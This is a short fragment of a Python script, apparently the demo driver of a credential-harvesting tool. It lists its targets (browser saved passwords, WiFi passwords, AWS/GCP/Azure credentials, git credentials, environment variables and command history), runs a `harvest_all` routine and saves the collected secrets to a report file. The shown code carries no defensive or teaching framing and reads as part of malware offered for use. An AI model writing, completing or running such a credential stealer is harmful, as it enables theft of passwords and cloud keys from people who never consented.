    print("    4.  Browser saved passwords ✓")
    print("    5.  WiFi passwords" + (" ✓" if ch.is_root else " (needs root)"))
    print("    6.  Cloud credentials (AWS/GCP/Azure) ✓")
    print("    7.  Git credentials ✓")
    print("    8.  Process environment variables" + (" ✓" if ch.is_root else " (needs root)"))
    print("    9.  Command history analysis ✓")
    print()

    results = ch.harvest_all()
    total = sum(len(v) for v in results.values())
    print(f"[*] Found {total} credential artifacts:")
    for cat, items in sorted(results.items()):
        if items:
            print(f"    {cat}: {len(items)} entries")

    path = ch.save_report()
    print(f"\n[*] Report saved to {path}")


if __name__ == "__main__":
    demo()
